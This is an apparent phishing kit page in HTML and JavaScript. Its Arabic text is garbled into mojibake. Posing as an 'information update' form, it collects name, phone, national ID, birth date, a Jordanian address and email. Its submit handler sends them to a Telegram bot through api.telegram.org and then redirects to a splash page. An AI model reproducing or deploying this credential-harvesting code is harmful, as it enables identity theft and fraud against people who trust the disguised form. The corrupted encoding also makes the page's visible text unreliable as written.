<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª</title>
<style>
:root{ --accent:#ff5a00; --bar:#2b2e36; }
html,body{height:100%;margin:0;padding:0;font-family:Arial,Helvetica,sans-serif;background:#fff;color:#000;}
/* Ø§Ù„Ø¨Ø§Ø± Ø§Ù„Ø¹Ù„ÙˆÙŠ */
.top-bar{background:var(--bar);color:#fff;padding:14px 48px;text-align:center;position:relative;}
.top-bar::after{content:"";display:block;height:3px;background:var(--accent);position:absolute;bottom:0;left:0;right:0}
.back-btn{position:absolute;right:12px;top:50%;transform:translateY(-50%);font-size:22px;color:#fff;text-decoration:none;}
.container{max-width:720px;margin:0 auto;padding:20px 16px 100px;box-sizing:border-box}
h2{text-align:center;margin:18px 0;font-size:20px}
label{display:block;margin:12px 0 6px;font-size:15px}
.input-row{display:flex;gap:12px;flex-wrap:wrap}
input[type="text"],input[type="tel"],input[type="email"],input[type="date"]{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;font-size:15px;box-sizing:border-box}
/* Ø²Ø± Ø«Ø§Ø¨Øª ÙÙŠ Ø§Ù„Ø£Ø³ÙÙ„ Ù…Ø¹ Ù…Ø³Ø§Ø­Ø© Ø¯Ø§Ø®Ù„ÙŠØ© Ù„Ù„ØµÙØ­Ø© */
.btn{width:calc(100% - 32px);max-width:720px;padding:14px;border:none;border-radius:10px;background:var(--accent);color:#fff;font-size:18px;position:fixed;left:50%;transform:translateX(-50%);bottom:18px;cursor:not-allowed;box-shadow:0 12px 30px rgba(0,0,0,0.12)}
.btn.active{cursor:pointer;background:#e44a00}
.suggest-note{font-size:13px;color:#666;margin-top:6px}
.form-row{margin-bottom:6px}
/* responsive */
@media (max-width:520px){.container{padding:12px 12px 120px}.top-bar{padding:12px 40px}.back-btn{font-size:20px}}
</style>
</head>
<body>
<div class="top-bar">
ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª
<a class="back-btn" href="verethad.html">â€¹</a>
</div>

<div class="container">
  <h2>Ø£Ø¯Ø®Ù„ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª</h2>
  <form id="infoForm" autocomplete="on">
    <div class="form-row">
      <label for="name">Ø§Ù„Ø§Ø³Ù… Ø¨Ø§Ù„ÙƒØ§Ù…Ù„</label>
      <input type="text" id="name" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„Ø§Ø³Ù… Ø¨Ø§Ù„ÙƒØ§Ù…Ù„" required>
    </div>

    <div class="form-row">
      <label for="phone">Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ</label>
      <input type="tel" id="phone" placeholder="Ø£Ø¯Ø®Ù„ Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ" inputmode="tel" required>
    </div>

    <div class="form-row">
      <label for="nationalId">Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ</label>
      <!-- Ù†Ø³Ù…Ø­ Ø¨Ø§Ù„Ø£Ø±Ù‚Ø§Ù… ÙÙ‚Ø· ÙˆÙ†Ø­Ø¯Ø¯ Ø·ÙˆÙ„ Ø£Ù‚ØµÙ‰ 10 (ÙŠÙ…ÙƒÙ† ØªØºÙŠÙŠØ±Ù‡) -->
      <input type="text" id="nationalId" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ" inputmode="numeric" maxlength="10" required>
      
    </div>

    <div class="form-row">
      <label for="dob">ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯</label>
      <input type="date" id="dob" required>
      <div id="dobFormatted" class="suggest-note"></div>
    </div>

    <div class="form-row">
      <label for="address">Ø§Ù„Ø¹Ù†ÙˆØ§Ù†</label>
      <input type="text" id="address" placeholder="Ø§Ø¨Ø­Ø« Ø¹Ù† Ø¹Ù†ÙˆØ§Ù†Ùƒ (Ø§Ù‚ØªØ±Ø§Ø­Ø§Øª Ù…Ù† Ø¬ÙˆØ¬Ù„ - Ø§Ù„Ø£Ø±Ø¯Ù†)" autocomplete="street-address" required>
      
    </div>

    <div class="form-row">
      <label for="email">Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ</label>
      <input type="email" id="email" placeholder="Ø£Ø¯Ø®Ù„ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ" required>
    </div>

    <button type="submit" id="submitBtn" class="btn">Ø§Ù„ØªØ§Ù„ÙŠ</button>
  </form>
</div>

<!-- ØªØ­Ù…ÙŠÙ„ Google Places API (Ø§Ø³ØªØ¨Ø¯Ù„ YOUR_GOOGLE_API_KEY Ø¨Ù…ÙØªØ§Ø­Ùƒ) -->
<script src="https://maps.googleapis.com/maps/api/js?key=YOUR_GOOGLE_API_KEY&libraries=places&region=JO&language=ar&callback=initAutocomplete" async defer></script>

<script>
// Ø¹Ù†Ø§ØµØ± ÙˆÙ†Ù‚Ø·Ø© Ø¥Ø¯Ø®Ø§Ù„
const form = document.getElementById('infoForm');
const btn = document.getElementById('submitBtn');
const inputs = Array.from(form.querySelectorAll('input'));
const nationalId = document.getElementById('nationalId');
const dob = document.getElementById('dob');
const dobFormatted = document.getElementById('dobFormatted');
const addressInput = document.getElementById('address');

// ØªÙØ¹ÙŠÙ„ Ø²Ø± Ø§Ù„ØªØ§Ù„ÙŠ Ø¨Ø¹Ø¯ ØªØ¹Ø¨Ø¦Ø© Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„
function updateButtonState(){
  const allFilled = inputs.every(i => i.value.trim() !== '');
  if(allFilled){ btn.classList.add('active'); btn.removeAttribute('disabled'); btn.style.cursor='pointer'; }
  else{ btn.classList.remove('active'); btn.setAttribute('disabled', true); btn.style.cursor='not-allowed'; }
}
inputs.forEach(i => i.addEventListener('input', updateButtonState));

// Ø¬Ø¹Ù„ Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ Ø£Ø±Ù‚Ø§Ù… ÙÙ‚Ø· (Ù…Ù†Ø¹ Ø§Ù„Ø£Ø­Ø±Ù) + Ù„ØµÙ‚
nationalId.addEventListener('keydown', (e) => {
  const allowed = ['Backspace','Delete','ArrowLeft','ArrowRight','Tab'];
  if (allowed.includes(e.key)) return;
  if (e.key.length===1 && !/^[0-9]$/.test(e.key)) e.preventDefault();
});
nationalId.addEventListener('input', ()=>{ nationalId.value = nationalId.value.replace(/\D/g,''); updateButtonState(); });
nationalId.addEventListener('paste', (e)=>{ e.preventDefault(); const paste = (e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,''); nationalId.value = paste.slice(0, nationalId.maxLength); updateButtonState(); });

// Ø¹Ù†Ø¯ Ø§Ø®ØªÙŠØ§Ø± ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯ Ù†Ø¹Ø±Ø¶Ù‡ Ø¨ØµÙŠØºØ© YYYY/MM/DD ÙƒÙ…Ø§ Ø·Ù„Ø¨Øª
function formatDateToYMD(value){ if(!value) return ''; const d = new Date(value); if (Number.isNaN(d.getTime())) return ''; const yyyy = d.getFullYear(); const mm = String(d.getMonth()+1).padStart(2,'0'); const dd = String(d.getDate()).padStart(2,'0'); return `${yyyy}/${mm}/${dd}`; }
dob.addEventListener('change', ()=>{ const f = formatDateToYMD(dob.value); dobFormatted.textContent = f ? `Ø§Ù„Ù…ÙØ¯Ø®Ù„: ${f}` : ''; updateButtonState(); });

// Google Places Autocomplete - Ù…Ù‚ÙŠØ¯Ø© Ù„Ù„Ø£Ø±Ø¯Ù†
function initAutocomplete(){
  if (!window.google || !google.maps) return;
  const ac = new google.maps.places.Autocomplete(addressInput, { componentRestrictions: { country: 'jo' }, fields: ['formatted_address','address_components','geometry'], types: ['address'] });
  ac.addListener('place_changed', () => {
    const place = ac.getPlace();
    // Ù†Ø¶Ø¹ Ø§Ù„Ø¹Ù†ÙˆØ§Ù† Ø§Ù„Ù…ÙÙ†Ø³Ù‚ ÙÙŠ Ø§Ù„Ø­Ù‚Ù„
    if(place && place.formatted_address) addressInput.value = place.formatted_address;
    updateButtonState();
  });
}

// Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ ØªÙ„Ø¬Ø±Ø§Ù… Ø«Ù… ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰ splash1.html
const BOT_TOKEN = 'Ø¶Ø¹_ØªÙˆÙƒÙ†_Ø§Ù„Ø¨ÙˆØª_Ù‡Ù†Ø§';
const CHAT_ID = 'Ø¶Ø¹_ChatID_Ù‡Ù†Ø§';
form.addEventListener('submit', function(e){
  e.preventDefault();
  // ØªØ£ÙƒØ¯ Ø£Ù† Ø§Ù„Ø²Ø± Ù…ÙØ¹Ù„
  if(btn.disabled) return;

  const data = {
    name: document.getElementById('name').value.trim(),
    phone: document.getElementById('phone').value.trim(),
    nationalId: nationalId.value.trim(),
    dob: formatDateToYMD(dob.value),
    address: addressInput.value.trim(),
    email: document.getElementById('email').value.trim()
  };

  const text = `ğŸ“‹ ØªØ­Ø¯ÙŠØ« Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª:\nğŸ‘¤ Ø§Ù„Ø§Ø³Ù…: ${data.name}\nğŸ“ Ø§Ù„Ù‡Ø§ØªÙ: ${data.phone}\nğŸ†” Ø§Ù„Ø±Ù‚Ù… Ø§Ù„ÙˆØ·Ù†ÙŠ: ${data.nationalId}\nğŸ‚ ØªØ§Ø±ÙŠØ® Ø§Ù„Ù…ÙŠÙ„Ø§Ø¯: ${data.dob}\nğŸ  Ø§Ù„Ø¹Ù†ÙˆØ§Ù†: ${data.address}\nğŸ“§ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ: ${data.email}`;

  // ØªØ­Ù‚Ù‚ Ù…Ù† Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù…
  if (!BOT_TOKEN || BOT_TOKEN.includes('Ø¶Ø¹_ØªÙˆÙƒÙ†') || !CHAT_ID || CHAT_ID.includes('Ø¶Ø¹_ChatID')){
    alert('ØªÙ†Ø¨ÙŠÙ‡: Ù„Ù… ØªÙ‚Ù… Ø¨Ø¥Ø¶Ø§ÙØ© Ø¨ÙŠØ§Ù†Ø§Øª Ø¨ÙˆØª Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù… ÙÙŠ Ø§Ù„ÙƒÙˆØ¯. Ø³ÙŠØªÙ… Ø¹Ø±Ø¶ Ø§Ù„Ù†ØªÙŠØ¬Ø© Ù…Ø­Ù„ÙŠÙ‹Ø§.');
    console.log('payload ->', text);
    // ØªØ­ÙˆÙŠÙ„ ØªØ¬Ø±ÙŠØ¨ÙŠ
    window.location.href = 'splash1.html';
    return;
  }

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify({ chat_id: CHAT_ID, text })
  })
  .then(res => res.json())
  .then(resp => {
    if(resp && resp.ok){
      // Ø¥Ø±Ø³Ø§Ù„ Ù†Ø§Ø¬Ø­ -> ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
      window.location.href = 'splash1.html';
    } else {
      alert('Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ ØªÙ„Ø¬Ø±Ø§Ù….');
      console.error('telegram response', resp);
    }
  })
  .catch(err => { alert('Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„'); console.error(err); });
});

// Ø§Ù†ÙØ±Ø¬ÙŠØ©: ØªØ£ÙƒØ¯ Ù…Ù† ØªØ­Ø¯ÙŠØ« Ø­Ø§Ù„Ø© Ø§Ù„Ø²Ø± Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
updateButtonState();

// Ù…Ù„Ø§Ø­Ø¸Ø©: ÙŠØ¬Ø¨ Ø§Ø³ØªØ¨Ø¯Ø§Ù„ YOUR_GOOGLE_API_KEY Ùˆ BOT_TOKEN Ùˆ CHAT_ID Ø¨Ø§Ù„Ù‚ÙŠÙ… Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠØ© Ù„Ø¶Ù…Ø§Ù† Ø¹Ù…Ù„ Ø§Ù„Ø§Ù‚ØªØ±Ø§Ø­Ø§Øª ÙˆØ§Ù„Ø¥Ø±Ø³Ø§Ù„.
</script>
</body>
</html>
